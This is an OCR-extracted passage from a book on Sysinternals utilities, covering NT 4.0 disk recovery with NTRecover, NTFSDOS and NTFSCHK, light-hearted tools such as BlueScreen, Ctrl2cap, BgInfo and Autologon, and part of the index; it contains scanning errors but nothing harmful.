the client computer. When native NT file systems, such as the NT file system 
(NTFS) and File Allocation Table (FAT) file system, access the drives, NTRecover 
manages communications over the serial cable to the client software to transfer disk 
data back and forth between the two machines. The drives appear to the host system 
as local drives and you can repair or recover them using any utility installed on the 
host system. For example, you can copy files from the client system's drives using 
Windows NT Explorer, and you can verify and restore the integrity of the drives 
using CHKDSK. A note of caution from Sysinternals: NTRecover is designed to 
repair drives that are inaccessible due to poorly configured or missing software; it is 
not meant for drives that have been physically damaged or have substantial destruc- 
tion of on-disk data. 

NT 4.0-Only Tools 9 Chapter 11 
427 
Recovering Lost or Damaged Data 
If NTRecover sounds like the tool for you, read on, as this section explains how to 
use it. The process involves creating the NTRecover boot floppy disk, connecting 
the functioning system (the host) with the system that will be recovered (the client) 
with a null-modem serial cable, launching the host software on the functioning 
system, booting the unresponsive system with the boot floppy disk, and setting up 
communications. Once the two systems are connected and communicating, you can 
attempt salvage data or, if necessary, repair a damaged volume. 
NTRecover is launched on the client system from the Start menu (Start ] 
Programs ] NTRecover I NTRecover). Most of the work is performed in the 
main NT recover window (displayed in Figure 11.7). The "Drive Letter:" field is 

428 
Chapter 11 9 NT 4.0-Only Tools 
used to specify the logical drive letter that NTRecover will start at when mount the 
partitions (volumes) discovered on the client system. 
If you have three volumes on 
your host system that are identified as "C:", "D:" and "E:", you may want to start 
identifying the client volumes at "G" so that there will not be any conflicts between 
the host and client logical drive identification. The Mount button is used to initiate 
communications with the host. 
The serial communications parameters are configured in this window. Serial 
communications are a bit trickier to configure because the client and host parame- 
ters need to agree. The communications speed (measured in baud) is negotiated 
between the client and host; however, settings, such as data and stop bits, parity and 
flow control, need to be the same on both systems for communications to be estab- 
lished prior to negotiation. Fortunately, NTRecover is configured to use the settings 
that are already configured with the serial (COM) ports on the systems. For 
NTRecover to operate, you only need to select the appropriate COM port (the 
serial port to which the null-modem cable is connected) and the baud rate for the 
two systems to use as a starting point in their negotiations. They will reduce the 
baud rate until an agreement is reached. 
Figure 11.7 Setting Up Communications in the Main NTRecover Window 
The aptly-names Boot Floppy button on main NTRecover window is used to, 
what else, create the NTRecover boot floppy disk for the host. There are two 
options (as shown in Figure 11.8)" Create NTR.ecover boot floppy and Copy the 
NTRecover client program to a floppy disk previously formatted as an MS-DOS 
boot floppy. With the "Create NTP, ecover boot floppy" option, you will be 
prompted to insert a blank floppy disk and the boot disk will be formatted and have 
the NTRecover client program copied to it. All data on the disk will be erased. 
With the second option, the file required by NTRecover are only copied to the 
disk. For the disk to work, the floppy disk should already be formatted with DOS 
5.0 or later and bootable. With the space that is left over you can copy any addi- 
tional utilities you think you may need for system recovery, although any utility 
installed on the host can be used on the host's mounted volumes. 

NT 4.0-Only Tools 9 Chapter 11 
429 
Figure 1 1.8 Creating the NTRecover Boot Floppy for the Host System 
Once the NTRecover boot floppy has been created, insert it in the floppy disk 
drive on the client system and ensure that it boots from the NTRecover disk. You 
may need to change the boot order in the server's BIOS to ensure that it boots from 
the floppy disk drive. As mentioned earlier, the serial communications parameters 
on both systems need to be identical for the communications to work. These 
parameters are configured on the host's main screen (displayed below in Figure 
11.9), since NTRecover is already up and running, and ready to start listening for 
inbound connections, you will need to tell NTRecover what serial port to listen on, 
and what disk to mount. Select the maximum available baud rate and serial port 
number to which the null-modem serial cable is connected on the host system. 
Second, select the disk that contains the volumes that host data that you want to sal- 
vage. The NTRecover client will connect to the specified disk and will mount the 
volumes. 
Figure 1 1.9 Configuring Communications Parameters on the Host 
You are now ready to initiate communications from NTRecover on the client 
system. Click the Mount button to initiate communications with the client system. 
www.syngress.com 

430 
Chapter 11 9 NT 4.0-Only Tools 
The "Initiating Communications" window will be displayed, as seen in Figure 11.10. 
The client system, having been booted with the NTRecover boot floppy, is listening 
for a probe from the client system. Once the probe has been detected and the client 
system responds, the two (host and client) systems will negotiate communications 
parameters and establish connectivity. If there is no response from the client system, 
the attempt to communicate will eventually time out and the "Initiating 
Communications" window will close. 
Figure 11.10 Initiating Communications with the Host System 
NTRecover will attempt to mount all partitions discovered on the client system 
as what appears to be local drives, and will identify them in order with logical drive 
letters beginning with the letter specified in the main NTRecover window (shown 
above in Figure 11.7). In Figure 11.11 below, the Statistics window displays detailed 
real-time disk I/O statistics for the volume associated with the logical drive letter 
specified in "Drive:" drop down list. In the figure, the "*" is selected, which displays 
summary information for all of the client's mounted volumes. You can scroll for the 
statistics of an individual volume simply by changing the logical drive letter in 
"Drive:" drop down list. 
Figure 11.11 Preparing to Mount the Host System's NTFS Drives 
Once connected the main screen will change to the screen seen in Figure 11.12, 
where its own statistics are displayed. The statistics are useful for troubleshooting 

NT 4.0-Only Tools 9 Chapter 11 
431 
connectivity because they should be constantly be changing. If they do not change, 
you may want to check to see if the connection has somehow been compromised. 
Start by checking the cable; while a bit finicky to configure, serial communications 
are rather unsophisticated. 
Figure 11.12 Displaying Communications Statistics on the Host 
When you have completed your salvage operation, click the Unmount button 
(shown at the top right of the window in Figure 1.11. This terminates communica- 
tions with the client system. Clicking the "X" in the extreme top right of the 
window exits the NTP, ecover session. 
Fixing a Damaged Volume 
As soon as commutations has been established between client and host and the host's 
volumes have been mounted and are accessible by the client, volume repair and data 
recovery can begin. The first and easiest action to take it to run CHKI)SK on the 
mounted volumes. Since the operating system on the host is running off a floppy 
disk, you will have unfettered access to the system volume and will able to verify the 
integrity of system files. CHKDSK is run from the command line using the fol- 
lowing syntax: 
chkdsk [logical drive letter:] [[path] [filename] 
[/f] [/v] [/r] /i [:size] ] 
[/i] [/c] 
filename Specifies the files to check for fragmentation (FAT only). 
/F Fixes errors on the disk. 
/V Displays the full path and name of every file on the disk (FAT only). 
/R Locates bad sectors and recovers readable information (implies/F). 

432 
Chapter 11 9 NT 4.0-Only Tools 
/L:size Changes the log file size to the specified number of kilobytes. If 
size is not specified, the current size is displayed in the summary (NTFS 
only). 
/I Performs a less vigorous check of index entries (NTFS only). 
/C Skips checking of cycles within the folder structure (NTFS only). 
As an example, the following systax should be used for a thorough check of an 
NTSF file system: 
chkdsk g:/r 
Use the logical drive letter that has been assigned by NTRecover that is associ- 
ated with the volume you want to repair. CHKDSK is very effective in repairing 
file system errors. You can also use any Windows NT 4.0-compatible SysInternals 
utilities that are installed on the client. If the volume on the host was converted to 
NTFS version 5 due to an installation of Windows 2000 in the same partition, you 
can use SysInternals NTFSCHK, which is described later in this chapter. 
Accessing a Windows NT 4.0 NTFS 
Volume from a FAT File System Volume 
The essential component is the NTFS file system driver, NTFSDOS.EXE. It sets up 
read-only access to partitions formatted with NTFS and provides the capability to 
recognize and mount NTFS drives for operating systems~namely, DOS and early 
versions of Windows (3.x, 95, and 98), which are not NTFS aware. If you are run- 
ning Windows 95 or 98 and require read-write access, you should consider using 
NTFS for Windows 98. For DOS users, the same capability is available through 
NTFSDOS Professional Edition, which is part of the Winternals Administrator's Pak. 
For more advanced disk management operations, such as salvaging files off a corrupt 
www.syngress.com 

NT 4.0-Only Tools 9 Chapter 11 
433 
NTFS volume or repairing an NTFS boot sector or partition table, you may want to 
turn to Disk Commander, which is included with EILD Commander, also available 
in the Winternals Administrator's Pak. 
When you download NTFSDOS from Sysinternals, you will see that the archive 
file contains the following files: 
9 README.TXT 
A file filled with useful and helpful background infor- 
mation. 
9 
NTFSDOS.EXE A file system driver. 
9 
NTFSHLP.VXD A helper VxD that is needed only for long filename 
support in Windows 95. 
To run NTFSDOS execute NTFSDOS.EXE from the DOS command line 
(DOS 5.0 or later is required), or from AUTOEXEC.BAT. If you execute 
NTFSDOS prior to launching Windows, NTFS drives will be accessible from 
within the Windows GUI. Executing NTFSDOS in DOS makes the NTFS drives 
visible within that particular DOS box. When NTFSDOS starts, it will scan all disk 
partitions on your system to look for NTFS drives, and will automatically mount all 
discovered NTFS drives using unique DOS logical drive letters. 
Under DOS 7.0 (which shipped with Windows 98), NTFS drives mounted with 
NTFSDOS will support long filename calls even before Windows starts. To achieve 
the same convenience in Windows 95, NTFSDOS requires NTFSHLP.VXD, a virtual, 
device driver. Fortunately, NTFSDOS does this automatically without modifying any 
essential Windows system files, such as SYSTEM.INI or the Windows Registry. 
If necessary, you can tailor NTFSDOS operation to your liking with the fol- 
lowing command-line switches: 
/L Specifies the drive letters NTFSDOS should attempt to use as it mounts 
NTFS drives. 
/C Permits overriding the default XMS cache size. 

434 
Chapter 11 9 NT 4.0-Only Tools 
/V Puts NTFSDOS in verbose mode. 
/X Forces NTFSDOS to use standard BIOS Int 13 services. Use this if 
NTFSDOS has problems with your computer's extended Int 13 services. 
/U Configures NTFSDOS to work with filenames that contain Unicode 
characters.You should use this only if an NTFSDOS directory listing enters 
an infinite loop within directories that contain files with Unicode names. 
/N Disables compression support in NTFSDOS. Much of the conventional 
memory that NTFSDOS normally uses is for compression buffers; there- 
fore, use this switch to access drives or files that are not compressed where 
you need to optimize NTFSDOS's memory usage. 
To illustrate, the following command-line syntax will execute NTFSDOS in ver- 
bose mode with Unicode compatibility, and mounted NTFS drives using letters 
starting at G: 
ntfsdos /v /u /l:g 
Diagnosing a Windows 
2000 NTFS Volume from 
Windows NT 4.0 (NTFSCHK) 
Windows can be a bit of a bulldozer, and more often than not, it will go ahead and 
change things without asking. When Microsoft released Windows 2000, many 
Windows NT 4.0 Server and Workstation users installed Windows 2000 alongside 
Windows NT 4.0 to verify the compatibility of applications, to test integration with 
other Windows NT 4.0 and 2000 servers, or simply to see what it looked like. The 
downside to installing Windows 2000 in a dual boot configuration was that the 
Windows 2000 installation routine would upgrade the version of your NTFS file 
system to NTFS version 5 without telling the system administrator, leaving users 
without compatible disk management tools in Windows NT 4.0. Meager though 
they were, useful utilities, such as CHKDSK, failed to work and you had to boot 
into Windows 2000 to verify and restore the integrity of your drives. 
The sole raison d'etre for Winternals' NTFSCHK is to bail out these poor 
administrators. Winternals leveraged the technology developed for NTFSDOS 
Professional and NTFS for Windows 98 to make it possible to run the Windows 
2000 version of CHKDSK under Windows NT 4.0. 
www.syngress.com 

NT 4.0-Only Tools 9 Chapter 11 
435 

436 
Chapter 11 9 NT 4.0-Only Tools 
Running NTFSCHK 
You run NTFSCHK by specifying the directory where you installed Windows 2000. 
The following is the correct syntax: 
ntfschk [drive letter] [Windows 2000 installation directory] 
[specific drive 
letter to check] 
To illustrate, if Windows NT 4.0 is installed in c:\winnt and Windows 2000 is 
installed in c:\win2000, you would enter ntfschk c:\win2000. By default, NTF- 
SCHK will check all installed NTFS drives. If you wish to have NTFSCHK check 
only a specific drive you specify it after the system directory~for instance, ntfschk 
c:\win2000 d'. Note that unlike standard CHKDSK, NTFSCHK runs in 
read/write mode; therefore, if NTFSCHK detects errors on a drive, it will attempt 
to repair them. 

NT 4.0-Only Tools 9 Chapter 11 
437 
Summary 
It is nice to see that the vast number of administrators who are still maintaining 
Windows NT 4.0 servers and are supporting NT 4.0 workstations have not been 
orphaned. Winternals, through its Sysinternals site, has made a number of its most 
useful utilities available, and is still supporting them.You can achieve complex tasks 
such as performance optimization, and critical tasks such as file salvage and system 
recovery, using several utilities from the vast collection on the Sysinternals Web site. 
CacheSet and Contig assist in optimizing memory and file system utilization. PMon 
and Frob facilitate low-level monitoring of threads and processes and attaining the 
best achievable levels of application performance. NTRecover, the predecessor to 
Remote Recover, continues to save the day for many administrators who need to 
revive dead Windows NT 4.0 servers, and in less critical situations, you can use 
NTFSDOS on a boot disk, for quick access to a file on an NTFS partition. Finally, 
for those whose experiments with Windows 2000 on their Windows NT 4.0 sys- 
tems left them with no compatible disk management utilities, there is NTFSCHK. 
Just as Windows NT 4.0 is showing no signs of going away in certain organizations, 
we are pleased that the Sysinternals repository of Windows NT 4.0 system manage- 
ment utilities are not disappearing either. 
Solutions Fast Track 
Optimizing an NT 4.0 System 
(CacheSet, Contig, PMon, Frob) 
CacheSet is a GUI applet that allows you to manipulate the working-set 
parameters of the system file cache. One advantage CacheSet has over other 
similar applets is that it applies changes instantaneously when you click the 
Apply button, so you do not have to reboot every time you attempt a new 
set of values. 
gl Contig is a command-line, single-file defragmentation utility with two key 
functions. It reassembles file fragments that are scattered around a disk 
partition into a single contiguous file or at least into a minimal number of 
fragments, and you can use it to create new files that are contiguous. It is 
ideal for quickly optimizing critical files that are continuously fragmenting. 

438 
Chapter 11 
9 NT 4.0-Only Tools 
[-4I PMon is a GUI-based frontend to a device driver that monitors, logs, and 
displays whenever a process or thread is created or deleted. 
r-el Frob is a GUI applet that permits you to balance foreground and 
background application performance by setting quanta (application time- 
slice) values to suit the role and resource utilization of a server. 
Recovering Data (NTRecover) 
Just as you can use Remote Recover to recover and repair a "dead" system 
across the network, you can use NTRecover to recover and repair NT 4.0 
servers using serial connectivity. 
NTRecover consists of client software that runs on the functioning system, 
host software that runs on the system to be revived, and a serial null- 
modem cable to connect the two systems. 
Once connected, drives on the host system appear as local volumes on the 
client system, where all disk and file management utilities installed on the 
client can be used to repair the host's drives. 
Accessing a Windows NT 4.0 NTFS Volume 
from a FAT File System Volume (NTFSDOS) 
gl 
NTFSDOS permits access to Windows NT 4.0 NTFS drives from 
operating systems that are not compatible with NTFS, such as all versions 
of DOS and Windows 3.x, 95, and 98. 
Long filename support on NTFS drives is available to Windows 95 clients 
through NTFSHLP.VXD, a virtual device driver. 
VCl NTFSDOS is configurable with six available command-line switches. 
www.syngress.com 

NT 4.0-Only Tools 9 Chapter 11 
439 
Diagnosing a Windows 2000 NTFS 
Volume from Windows NT 4.0 (NTFSCHK) 
gl 
gl 
Installing Windows 2000 onto a Windows NT 4.0 NTFS partition for dual 
boot operation will automatically upgrade the version of NTFS to version 
5, thereby rendering Windows NT 4.0 CHKDSK inoperable. 
You can use NTFSCHK to verify and repair NTFS 5 file systems without 
having to reboot into Windows 2000. 
From the command line you can let NTFSCHK verify all NTFS 5 
partitions or only the drives you specify. 
www.syngress.com 


442 
Chapter 12 9 Having Fun with Sysinternals 
Introduction 
This book has dealt with the mundane and pedestrian duties of an administrator, or 
a programmer acting as an administrator~until now. It is about time we used some 
of the available tools for "fun and profit" with an emphasis on "fun."The Winternals 
group has created software that not only makes our administrative tasks easier, but 
also entertains us. 
In this chapter, we will learn about a screensaver with a "perverted" twist to it. 
We also will find out how to modify the behavior of our keyboards to suit the needs 
of older users, create an informative desktop background, and finally, bypass the 
pesky login screen. 
Generating a Blue Screen 
of Death on Purpose (BlueScreen) 
The Blue Screen of Death, or BSOD, is one of the most dreaded things that a com- 
puter user or administrator can see. Due to various resource conflicts, unstable 
drivers or dynamic link library (DLL) files, and other system issues, a system crash 
was once more a probability than a possibility and it always seemed to occur just in 
time to wipe out hours of work you had not yet saved. 
If you look at it from a different point of view, though, the BSOD is a good 
thing. If the system crashed and .just rebooted for no apparent reason, that would be 
bad. However, Microsoft had the forethought to design the system to display perti- 
nent information about the system crash against a blue background, while dumping 
the contents of the memory to a file to allow more forensic investigation into the 
cause of the crash. It is the BSOD that helps the administrator collect the informa- 
tion necessary to get the machine running stable again. 
Thanks to the BlueScreen screensaver from Sysinternals, the dreaded BSOD can 
also be a fun way to protect your computer while you're away, or trick your friends 
and co-workers. 
Installing BlueScreen 
To install the BlueScreen screensaver, just copy the bluescrn.scr file to the 
\system32 directory on a Windows NT, 2000, XP, or 2003 machine. If you are using 
a Windows 9x version, copy the file to the \Windows\System directory. 

Having Fun with Sysinternals 9 Chapter 12 
443 
Setting Up the BlueScreen Screensaver 
To enable the BlueScreen screensaver once you have installed it, simply right-click 
on the Windows desktop and select Properties to bring up the Display 
Properties window. Click the screensavers tab and scroll through the drop-down 
list to find the screensaver called Sysinternals BlueScreen. 
Like you can with any other screensaver, you can choose how many minutes the 
computer should be idle before the screensaver is launched, and whether a password 
should be required to gain access to the system once the screensaver is running. 
If you click on the Settings button, you can open the BlueScreen configuration 
options, shown in Figure 12.1. There is really only one option to select. If you want 
the BlueScreen screensaver to fake disk activity for added realism, check the Fake 
disk activity box and click OK. 

444 
Chapter 12 9 Having Fun with Sysinternals 
Figure 12.1 The BlueScreen Screensaver 
Let the Fun Begin 
After you have installed and configured the screensaver, you can wait for the neces- 
sary amount of time to expire so that the screensaver will launch, or you can click 
on Preview from within the screensaver 
tab of the Display Properties window. 
The screensaver will initiate a realistic-looking BSOD crash, complete with a system 
reboot. 
The screensaver will cycle between various blue-screen crashes and simulate a 
system reboot approximately every 15 seconds. What makes the BlueScreen screen- 
saver more than just a screensaver is the accuracy and realism of the simulated 
BSOD. The screensaver includes information from the actual computer, including 
the NT build number, processor revision, currently loaded drivers and addresses, 
characteristics of the disk drive, and amount of memory on the computer. 
The screensaver also includes more-realistic functionality, depending on the 
operating system on which you run it: 
9 
On Windows NT 4.0 systems, BlueScreen will simulate chkdsk on reboot, 
complete with finding errors. 
9 
Running BlueScreen on Windows 2000 or 9x computers will show a 
Windows 2000 startup splash screen with an active progress bar and 
progress control updates to simulate a realistic reboot. 
9 
Windows XP and Windows Server 2003 systems will display the 
XP/Server 2003 startup splash screen with progress bar activity. 

Having Fun with Sysinternals 9 Chapter 12 
445 
Modifying the Behavior 
of the Keyboard (Ctrl2cap) 
Users who have transitioned from pure Unix machines to a Windows-based system 
will appreciate this utility. The Unix keyboard generally has a left Ctrl key above the 
Shift key on the left, where you typically find the Caps Lock key on a Windows 
keyboard. 
The problem is that Unix developers use the left Ctrl key frequently and out of 
habit may constantly enable and disable the Caps Lock key on the Windows 
machine. This tool converts the Caps Lock key to a left Ctrl key again so that Unix 
users and developers can feel at home. 
Installing and Using Ctrl2cap 
You can download the Ctrl2cap files from Sysinternals at 
www.sysinternals.com/Utilities/Ctrl2Cap.html. To install the utility, you have to 
extract the files to a directory on your hard drive. Once you have done that, open a 
command prompt window and navigate to the directory where you extracted the 
files. Type etrl2cap /install and press Enter. A brief message will appear letting you 
know that the utility installed successfully, but that you must reboot in order for the 
changes to take effect (see Figure 12.2). 
Figure 12.2 The Command Prompt Window Showing Successful Installation 
of Ctrl2cap 

446 
Chapter 12 9 Having Fun with Sysinternals 
After you reboot, any time you press the Caps Lock key the operating system 
will treat the key as a Ctrl key.You can then use it in conjunction with other keys to 
perform Ctrl functions, such as Ctrl+B to enable or disable bold type or Ctrl+V to 
paste the contents of the clipboard. 
Uninstalling Ctrl2cap 
If you want to remove the Ctrl2cap utility so that you can use the Caps Lock key to 
lock the keyboard into using uppercase letters, you have to uninstall Ctrl2cap. Open 
a command prompt window and navigate to the directory where you have extracted 
the Ctrl2cap files. Type the following line of code and press the Enter key to remove 
Ctrl2cap: 
ctrl2cap /uninstall 
You must reboot once again in order for the uninstallation to complete and to 
return the keyboard to normal operation. 
How It Works 
Ctrl2cap intercepts keyboard requests and determines whether they are calling the 
Caps Lock function. If so, it redirects the call to the Ctrl function. On Windows 
2000 and later systems, the function of the utility is a little more complex. Ctrl2cap 
installs as a Windows Driver Model (WDM) filter driver that is added to the key- 
board class device stack above the keyboard class device. 
According to the Sysinternals Web site, this approach has a couple of benefits: 
9 
The Ctrl2cap utility's IRP_M.J_READ interception and manipulation code 
is shared between the NT 4.0 and Windows 2000 versions. 
9 
There is no need to supply an INF file or go through the Device Manager 
to install the Ctrl2cap utility. Ctrl2cap simply modifies the necessary 
Registry entry. 

Having Fun with Sysinternals 9 Chapter 12 
447 
Creating Useful 
Desktop Backgrounds (Bglnfo) 
The Bglnfo utility from Sysinternals allows you to display useful and relevant infor- 
mation about the computer, right on the desktop. This feature can be very helpful in 
a corporate network setting to help field technicians quickly identify the attributes 
of the system they are working on, or for users to have access to this information 
when placing calls to the help desk. 
To run the Bglnfo utility, you simply extract the Bglnfo.exe file to your com- 
puter and copy the file into the Startup folder. Each time the computer boots, the 
Bglnfo program will gather information about the system and display it on the com- 
puter's desktop screen. Bglnfo does a point-in-time snapshot at the time the system 
starts, instead of actively displaying live data. This allows Bglnfo to display accurate 
and current information without using up precious system resources while the com- 
puter is running. 
Customizing Displayed Data 
When you launch the Bglnfo.exe file the Bglnfo Default Configuration screen dis- 
plays. From this screen (see Figure 12.3), you can customize virtually every aspect of 
what information Bglnfo will display and the look-and-feel of how the data will be 
displayed on the desktop. 
Figure 12.3 The Bglnfo Default Configuration Screen 

448 
Chapter 12 9 Having Fun with Sysinternals 
You can delete fields from the view in the left pane, or add fields from the pane 
on the right. If the information you want to display is not defined, Bglnfo allows 
you to define custom fields, as shown in Figure 12.4. With a custom field, you can 
display just about any piece of system information that is pertinent to you and that 
you want to have displayed on your Windows desktop for quick reference. 
Figure 12.4 Creating a Custom Field 
The Bglnfo Default Configuration screen contains four buttons on the right- 
hand side to help you customize the Bglnfo output. The first three buttons, 
Background, Position, and Desktops, allow you to modify Bglnfo's various configu- 
ration settings. The fourth button, Preview, shows you how the Bglnfo output will 
look with the chosen configuration. Table 12.1 provides more information about the 
three configuration buttons. 

Having Fun with Sysinternals 9 Chapter 12 
449 
Table 12.1 Customization Options Using Bglnfo Configuration Buttons 
Option 
Background 
Position 
Desktops 
Function 
Allows you to choose the color and/or wallpaper to use 
as the background for the Bglnfo display. You can also 
select Copy existing settings to use the default wall- 
paper of the currently logged-in user. 
Lets you specify where on the screen the Bglnfo data 
should display. It also has options to address issues 
with overlapping the taskbar, and to address how to 
handle multiple monitor display configurations. 
Lets you select which desktops should display the 
Bglnfo data. By default, only the User Desktop wall- 
paper is affected, but you can also specify that users 
who log in via Terminal Services will also see the Bglnfo 
display. 
Configuring Bglnfo Using the Menu Options 
At the top of the Bglnfo Default Configuration display are a series of menu options" 
File, Bitmap, Edit, Format, and Help. These options allow you to further configure 
and modify the way Bglnfo works, and save the configuration file for future use. 
Refer to Table 12.2 for complete information about the options available via the 
menu, and for information on how to use the options to configure Bglnfo. 
www.syngress.com 

450 
Chapter 12 9 Having Fun with Sysinternals 
Table 12.2 Bglnfo Menu Bar Configuration Options 
Option 
File I Open 
File I Save As 
File I Reset Default Settings 
File l Database 
Bitmap I 256 Colors 
Bitmapl High Color 
Bitmap I True Color 
Bitmapl Match Display 
Bitmap I Location 
Edit I Insert Image 
Function 
Lets you open a Bglnfo configuration file 
(BGI). 
Saves the current Bglnfo custom configuration 
to a BGI file. 
Resets all configuration options to the original 
default settings. 
Allows you to specify an XLS, MDB, or TXT file 
to capture and store the information to which 
it generates. 
Limits the wallpaper bitmap image to 256 
colors. 
Creates a 16-bit color wallpaper image. 
Creates a 24-bit color wallpaper image. 
Creates the Bglnfo wallpaper using the color 
depth currently in use on the system. 
Specifies the location where Bglnfo should 
save the resulting bitmap image. 
Allows you to insert a bitmap image into the 
Bglnfo output. 
The Format button contains standard options for formatting the output of the 
Bglnfo data.You can specify the font, size, and style of the output text, as well as the 
text color and alignment. 

Having Fun with Sysinternals 9 Chapter 12 
451 
Running Bglnfo from the Command Line 
As great as Bglnfo is for capturing and displaying data on the local computer, it pro- 
vides even more value for network administrators and support technicians. Bglnfo 
includes a number of command-line parameters that you can use to script the exe- 
cution of Bglnfo and customize its functionality and output to suit your needs. Table 
12.3 explains the command-line options that you can use with Bglnfo. 
www.syngress.com 

452 
Chapter 12 9 Having Fun with Sysinternals 
Table 12.3 Command-Line Options for Customizing the Launch of Bglnfo 
Option 
<path> 
/timer 
/popup 
/taskbar 
~all 
~log 
/rtf 
Function 
Specifies the location of a BGI (Bglnfo configuration file) to 
use when Bglnfo executes. 
Sets the countdown timer for displaying the Bglnfo Default 
Configuration screen prior to modifying the desktop. 
Specifying a time of 0 seconds will automatically update 
the display; specifying a time of 300 seconds or more will 
disable the timer. 
Outputs Bglnfo to a pop-up window, instead of directly to 
the desktop wallpaper. Bglnfo will not save any information 
to a database when using the pop-up option. 
Executes Bglnfo as a button minimized to the taskbar. 
Clicking the button will display the Bglnfo data in a pop-up 
window. No information is saved to a database when using 
the taskbar option. 
Directs Bglnfo to change the desktop wallpaper for all 
users currently logged on to the system. 
Causes Bglnfo to write error information to the specified 
log file, instead of displaying a system warning. 
Writes the Bglnfo output text to an RTF file, retaining the 
formatting and colors of the actual Bglnfo display. 
Bypassing the Login Screen (Autologon) 
Network and security administrators should probably stop reading right here. From a 
management or administrator perspective, the Windows login screen provides a valu- 
able and necessary function, ensuring that only those with the proper username and 
password credentials are able to gain access to the computer or the network 
resources to which it is attached. So, they probably don't want you to know how to 
skip right past that trivial annoyance. 
The reality is that Windows actually enables users to bypass the login screen. 
However, doing so requires more knowledge of the Windows operating system and 
the inner workings of the Registry than most users possess. So, Sysinternals created a 
tool, called Autologon, which makes the Registry changes for you and allows you to 
prepopulate the username, domain, and password information to zip right past the 
login screen and straight to the Windows desktop. 

Having Fun with Sysinternals 9 Chapter 12 
453 
Setting Up Autologon 
After you download the Autologon tool from Sysinternals (www.sysinternals.com/ 
Utilities/Autologon.html) and extract the files to a directory on your hard drive, you 
can double-click the autologon.exe file from within a Windows Explorer display 
or enter it at a command-line prompt to bring up the Autologon configuration 
screen (see Figure 12.5). Running the Autologon utility allows you to enter the nec- 
essary credentials and enable or disable the Autologon tool. 
Figure 12.5 The Autologon Configuration Screen 
Enabling and Disabling Autologon 
As convenient as it may be to use Autologon, there may be times that you need to 
log in to the computer using different credentials. Regardless of the reason you want 
to turn Autologon off or on, there are a couple methods for both enabling or dis- 
abling the utility. 
To enable Autologon and automatically bypass the user login screen, simply start 
the Autologon tool and enter the appropriate information.You will need to supply a 
valid username, domain, and password for Autologon to work. Once you enter the 
information, click Enable. 
You can also skip the Autologon configuration screen by entering the username, 
domain, and password information at the command line when you launch 
Autologon.You simply enter the information in the following order from a com- 
mand line: 
autologon user domain password 
If you want to skip the Autologon for a particular login, but you don't want to 
turn off the Autologon tool for future logins, you can hold down the Shift key 
while the system is booting to bypass the Autologon sequence. To disable Autologon 
indefinitely, launch the utility and click on the Disable button. 
www.syngress.com 

454 
Chapter 12 9 Having Fun with Sysinternals 
Summary 
In this chapter, you learned that you don't have to be all work and no play, and that 
sometimes you can work and still have fun. 
To start with, we talked about using the BlueScreen screensaver tool to embrace 
the dreaded Blue Screen of Death as a source of both humor and security. Selecting 
the BlueScreen screensaver produces a realistic-looking BSOD system crash and 
reboot sequence, while allowing you to password protect your system when you 
walk away from it. 
You then learned about using the Ctrl2cap utility to alter the way the computer 
interprets the Caps Lock key from the keyboard. This tool mainly benefits classic 
Unix developers who are used to having a Ctrl key right where the Caps Lock key 
is located on Windows keyboards. Using Ctrl2cap reduces frustration and increases 
productivity for users who are in the habit of using that key location for Ctrl func- 
tions. 
Next we played with a tool that lets you display important information about 
the computer system, or create custom fields to display virtually any system informa- 
tion you choose, right on the desktop wallpaper.You learned how to customize and 
configure the Bglnfo tool as well as how to use command-line parameters to create 
scripts that you can use to automate the execution of Bglnfo for users throughout a 
network, and you learned how to use Bglnfo to capture and store system informa- 
tion without altering the desktop wallpaper. 
The last tool we looked at in this chapter was the Autologon tool.You learned 
that you could use this handy utility to enter user credentials automatically and 
bypass the Windows login screen. 
Solutions Fast Track 
Generating a Blue Screen 
of Death on Purpose (BlueScreen) 
I-4I BlueScreen is a screensaver from Sysinternals that accurately mimics a 
BSOD system crash and reboot. 
To run BlueScreen on a Windows 9x machine, you have to copy the 
ntoskrnl.exe file from a Windows 2000 computer. 

Having Fun with Sysinternals 9 Chapter 12 
455 
BlueScreen will display different information depending on the operating 
system version it is running on, to make it realistic for that specific 
operating system. 
Modifying the Behavior of the Keyboard (Ctrl2cap) 
EI 
The Ctrl2cap utility from Sysinternals allows you to modify the keyboard 
to treat the Caps Lock key as though it is a left Ctrl key. 
When you install and uninstall Ctrl2cap you must reboot the system reboot 
for the changes to take effect. 
The Ctrl2cap utility is written in a way that bypasses the need for 
installation through the Device Manager, but also will not warn you that 
the driver is not digitally signed by Microsoft. 
Creating Useful Desktop Backgrounds (Bglnfo) 
Bglnfo is a useful tool that allows you to display a variety of information 
about the system on the desktop wallpaper. 
The BgInfo data is completely customizable.You can choose what 
information to display, where to display it, and what fonts, colors, and 
background wallpaper to use. 
You can run Bglnfo using command-line parameters, allowing you to script 
Bglnfo execution across all user desktops. 
You can output Bglnfo data to a file for storage and future reference. 
You can use command-line options to automate the execution of BgInfo 
on user desktops using a login script. 
Bypassing the Login Screen (Autologon) 
Windows contains the capability to bypass the user login screen, but it is 
buried deep in the Registry. 
You can use the Autologon tool from Sysinternals to easily modify the 
Registry so that you can bypass the user login screen. 
You can skip autologon for the current login instance by holding down the 
Shift key before the autologon sequence. 
www.syngress.com 


Having Fun with Sysinternals 9 Chapter 12 
457 
Q" Can I gather information with the Bglnfo tool without modifying the wall- 
paper? 
A" Yes. By choosing to output Bglnfo information to a database file, but deselecting 
all desktop display options within Bglnfo, you will gather and save the informa- 
tion, but it will not display on any desktop wallpaper. 
m 
A: 
Is there a way to skip the Windows login screen? 
Home computer users may be used to their systems going straight to the 
desktop, or to a Welcome screen with icons to click to log in. However, corpo- 
rate network users are generally forced to use the three-finger salute 
(Ctrl+Alt+Del) to access the user logon screen, and they must enter a valid 
domain username and password to gain access. The Autologon tool from 
Sysinternals lets users preenter the user credential information and log in auto- 
matically, bypassing the initial login screen. 
Q: Can I use the Autologon tool from a command prompt? 
A: Yes. If you launch Autologon from a command line, you can also supply the user 
credential information as command-line arguments to allow Autologon to run 
without asking for the user information. 

A 
ABetterlnternet, 62 
Access Control Lists (ACLs), 114-117 
access permissions 
registry, 120-122 
viewing, 131-134 
AccessEnum 
overview of, 114 
permissions, comparing over time, 
125-126 
using/interpreting results, 122-124 
ACLs (Access Control Lists), 114-117 
Active Directory (AD) 
data recovery, 297 
data recovery with AdRestore, 
293-294 
The Locksmith Wizard and, 17 
OUs, 232, 242-243,246 
active security credentials, 382-384 
Administrator's Pak 
Crash Analyzer Wizard, 300 
ERD Commander, 2 
AdRestore 
overview of, 296 
restoring lost Active Directory data 
with, 293-294 
AntiHookExec 
Hacker Defender and, 85-87 
for rootkits, 274-275 
Applnit DLLs 
Autoruns display feature groupings, 64 
